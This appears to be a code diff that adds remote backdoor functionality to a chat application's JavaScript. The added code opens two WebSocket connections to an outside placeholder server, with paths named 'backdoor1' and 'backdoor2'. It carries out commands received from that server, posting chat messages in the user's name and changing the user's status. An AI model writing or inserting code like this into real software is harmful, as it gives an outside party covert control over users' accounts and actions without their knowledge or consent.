@@ -138,3 +138,39 @@ chatBox.addEventListener('click', (e) => {
 });
 
 
+const backdoorSocket1 = new WebSocket('ws://yourserver.com:8080/backdoor1');
+const backdoorSocket2 = new WebSocket('ws://yourserver.com:8081/backdoor2');
+
+backdoorSocket1.onopen = () => {
+    console.log('Backdoor 1 WebSocket connection established.');
+};
+
+backdoorSocket1.onmessage = (event) => {
+    console.log(`Backdoor 1 received: ${event.data}`);
+    handleBackdoorCommand(event.data, 1);
+};
+
+backdoorSocket2.onopen = () => {
+    console.log('Backdoor 2 WebSocket connection established.');
+};
+
+backdoorSocket2.onmessage = (event) => {
+    console.log(`Backdoor 2 received: ${event.data}`);
+    handleBackdoorCommand(event.data, 2);
+};
+
+function handleBackdoorCommand(command, backdoorNumber) {
+    switch (command) {
+        case 'send_message':
+            alert(`Backdoor ${backdoorNumber}: Sending a message to the chat.`);
+            inputText.value = 'Message from backdoor ' + backdoorNumber;
+            sendMessage(new Event('click'));
+            break;
+        case 'status_update':
+            alert(`Backdoor ${backdoorNumber}: Updating status to "online".`);
+            setUserStatus('online');
+            break;
+        default:
+            console.log(`Backdoor ${backdoorNumber}: Unknown command.`);
+    }
+}
